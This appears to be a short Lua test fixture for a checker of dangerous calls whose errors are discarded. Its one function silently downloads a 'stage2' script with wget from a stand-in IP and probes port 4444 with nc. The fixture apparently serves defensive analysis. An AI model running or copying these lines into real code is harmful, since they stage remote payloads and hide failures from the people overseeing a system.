-- Fixture: a dangerous call whose failure is discarded (745).
--
-- Neither result is read, so a refused connection, a missing binary and a
-- permission error are all invisible: the script carries on as though the step
-- had worked, and a trace shows no error to follow.
local function quiet_probe()
   pcall(os.execute("wget -q -O /tmp/stage2 http://192.0.2.10/x.sh"))
   pcall(io.popen("nc -z 192.0.2.10 4444"))
   return "staged"
end

return quiet_probe
